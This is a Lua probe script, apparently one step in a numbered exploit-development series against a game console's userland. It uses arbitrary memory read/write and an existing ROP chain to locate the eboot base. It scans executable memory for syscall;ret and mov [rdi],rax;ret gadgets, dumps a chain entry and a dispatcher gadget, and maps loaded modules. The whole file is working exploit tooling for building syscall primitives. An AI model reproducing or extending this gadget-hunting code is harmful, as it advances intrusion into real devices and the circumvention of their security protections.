-- CRASH_CLASS: LOW
-- PROBE 127e: Find syscall instruction in readable memory
--
-- 127c/127d found NO syscall in eboot because Lua 5.1 doesn't support \xNN.
-- This probe uses decimal escapes (\NNN) and also reads the function at
-- 0x1DA270070 (readable, in ROP chain entry [79]) for syscall instruction.
--
-- Targets:
-- 1. Re-scan eboot for 0F 05 C3 (syscall;ret) with correct escapes
-- 2. Read function at chain entry [79] for syscall instruction
-- 3. Dump the dispatcher gadget at +0x136970 for call mechanism

print("=== PROBE 127e: SYSCALL HUNT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local text_size = rd(N(info) + 0x110) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
if text_size < 0 then text_size = text_size + 0x100000000 end

local E = N(uint64(string.format("0x%X%08X", text_hi, text_lo)))
print(string.format("eboot=0x%X%08X size=0x%X", text_hi, text_lo, text_size))

-- Parse pipe
local pipe_str = tostring(syscall.pipe)
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
print("rop=" .. (rop_str or "nil"))

-- [A] Verify Lua escape handling
print("")
print("[A] Escape verification")
-- In Lua 5.1: \NNN is decimal, \x is NOT supported
local test_str = string.char(0x0F, 0x05, 0xC3)
print(string.format("  test_str len=%d bytes: %02X %02X %02X",
    #test_str, string.byte(test_str, 1), string.byte(test_str, 2), string.byte(test_str, 3)))

-- Build search patterns with string.char (guaranteed correct)
local PAT_SYSCALL_RET = string.char(0x0F, 0x05, 0xC3)
local PAT_SYSCALL = string.char(0x0F, 0x05)
local PAT_MOV_RDI_RAX = string.char(0x48, 0x89, 0x07, 0xC3)

-- [B] Re-scan eboot with correct patterns
print("")
print("[B] Eboot scan with correct patterns")

local syscall_ret_found = {}
local syscall_bare_found = {}
local mov_found = {}

local CHUNK = 0x10000
local overlap = 4  -- overlap to catch cross-boundary patterns

for base_off = 0, text_size - 1, CHUNK - overlap do
    local read_size = CHUNK
    if base_off + read_size > text_size then
        read_size = text_size - base_off
    end
    if read_size < 4 then break end

    local addr = uint64(string.format("0x%X%08X", text_hi, text_lo + base_off))
    local ok, chunk = pcall(function()
        return memory.read_buffer(addr, read_size)
    end)
    if not ok or type(chunk) ~= "string" then
        print(string.format("  read_buffer failed at +0x%X", base_off))
        break
    end

    -- syscall;ret
    local pos = 1
    while #syscall_ret_found < 10 do
        local f = string.find(chunk, PAT_SYSCALL_RET, pos, true)
        if not f then break end
        syscall_ret_found[#syscall_ret_found + 1] = base_off + f - 1
        pos = f + 1
    end

    -- bare syscall (first 5 only)
    pos = 1
    while #syscall_bare_found < 5 do
        local f = string.find(chunk, PAT_SYSCALL, pos, true)
        if not f then break end
        syscall_bare_found[#syscall_bare_found + 1] = base_off + f - 1
        pos = f + 1
    end

    -- mov [rdi],rax;ret (first 5 only)
    pos = 1
    while #mov_found < 5 do
        local f = string.find(chunk, PAT_MOV_RDI_RAX, pos, true)
        if not f then break end
        mov_found[#mov_found + 1] = base_off + f - 1
        pos = f + 1
    end

    if base_off % 0x80000 == 0 and base_off > 0 then
        print(string.format("  0x%X/%X sc_ret=%d sc=%d mv=%d",
            base_off, text_size, #syscall_ret_found, #syscall_bare_found, #mov_found))
    end
end

local function report(name, list)
    if #list == 0 then
        print(string.format("  %-25s NOT FOUND", name))
    else
        local parts = {}
        for _, off in ipairs(list) do
            parts[#parts + 1] = string.format("+0x%X", off)
        end
        print(string.format("  %-25s [%d] %s", name, #list, table.concat(parts, " ")))
    end
end

print("")
report("syscall;ret", syscall_ret_found)
report("syscall bare", syscall_bare_found)
report("mov[rdi],rax;ret", mov_found)

if not alive() then print("DIED!") return end

-- [C] Read function at ROP chain entry [79] = 0x1DA270070
print("")
print("[C] Function at chain entry [79]")

-- First get the actual address from the chain (it's ASLR-dependent)
local ROP = N(uint64(rop_str))
local entry79 = rq(ROP + 79 * 8)
if entry79 then
    print(string.format("  entry[79] = %s", fmt(entry79)))
    local e79 = N(entry79)
    local e79_h, e79_l = get_hi_lo(entry79)
    if e79_h < 0 then e79_h = e79_h + 0x100000000 end

    -- Try reading 256 bytes from this function
    local fn_ok, fn_data = pcall(function()
        return memory.read_buffer(entry79, 256)
    end)
    if fn_ok and type(fn_data) == "string" then
        print(string.format("  readable! %d bytes", #fn_data))

        -- Hex dump first 64 bytes
        for row = 0, 60, 16 do
            local line = string.format("  +%02X: ", row)
            for col = 0, 15 do
                local idx = row + col + 1
                if idx <= #fn_data then
                    line = line .. string.format("%02X ", string.byte(fn_data, idx))
                end
            end
            print(line)
        end

        -- Search for syscall (0F 05) in this function
        local sc_pos = string.find(fn_data, PAT_SYSCALL, 1, true)
        if sc_pos then
            local after = (sc_pos + 2 <= #fn_data) and string.byte(fn_data, sc_pos + 2) or 0
            print(string.format("  *** SYSCALL at entry79+0x%X (next byte: %02X) ***",
                sc_pos - 1, after))
            if after == 0xC3 then
                print("  *** SYSCALL;RET FOUND! ***")
            end
        else
            print("  no syscall in first 256 bytes")
        end

        -- Also search for RET (C3) to understand function boundaries
        local ret_pos = string.find(fn_data, string.char(0xC3), 1, true)
        if ret_pos then
            print(string.format("  first ret at +0x%X", ret_pos - 1))
        end
    else
        print("  NOT readable (XO)")
    end
else
    print("  entry[79] read failed")
end

if not alive() then print("DIED!") return end

-- [D] Read more from the dispatcher gadget at +0x136970
print("")
print("[D] Dispatcher gadget at +0x136970")
local disp_addr = E + 0x136970
local disp_ok, disp_data = pcall(function()
    return memory.read_buffer(uint64(string.format("0x%X%08X",
        text_hi, text_lo + 0x136970)), 32)
end)
if disp_ok and type(disp_data) == "string" then
    local line = "  bytes: "
    for i = 1, math.min(32, #disp_data) do
        line = line .. string.format("%02X ", string.byte(disp_data, i))
    end
    print(line)
    -- Decode: 4D 89 E9 = mov r9, r13
    -- Then FF xx = call/jmp indirect
    if #disp_data >= 4 then
        local b3 = string.byte(disp_data, 4)
        local b4 = string.byte(disp_data, 5)
        print(string.format("  after mov r9,r13: %02X %02X (call/jmp opcode)", b3, b4))
    end
end

-- [E] Identify what module the entry[79] address belongs to
print("")
print("[E] Module identification for entry[79]")
local sc_info = mk(593)
if entry79 then
    local e79_h, e79_l = get_hi_lo(entry79)
    if e79_h < 0 then e79_h = e79_h + 0x100000000 end
    if e79_l < 0 then e79_l = e79_l + 0x100000000 end

    local mod_info = memory.alloc(0x200)
    for handle = 0, 38 do
        wd(N(mod_info), 0x160)
        local ok = pcall(function() sc_info(uint64(handle), mod_info) end)
        if ok then
            local m_lo = rd(N(mod_info) + 0x108) or 0
            local m_hi = rd(N(mod_info) + 0x10C) or 0
            local m_sz = rd(N(mod_info) + 0x110) or 0
            if m_lo < 0 then m_lo = m_lo + 0x100000000 end
            if m_hi < 0 then m_hi = m_hi + 0x100000000 end
            if m_sz < 0 then m_sz = m_sz + 0x100000000 end

            if m_hi == e79_h and e79_l >= m_lo and e79_l < m_lo + m_sz then
                -- Read name at +0x18 (offset in module info struct)
                local name_parts = {}
                for i = 0, 63, 4 do
                    local d = rd(N(mod_info) + 0x18 + i) or 0
                    if d == 0 then break end
                    for j = 0, 3 do
                        local b = math.floor(d / (2 ^ (j * 8))) % 256
                        if b == 0 then break end
                        name_parts[#name_parts + 1] = string.char(b)
                    end
                end
                local name = table.concat(name_parts)
                print(string.format("  handle=%d base=0x%X%08X size=0x%X name=%s",
                    handle, m_hi, m_lo, m_sz, name))
            end
        end
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127e COMPLETE ===")
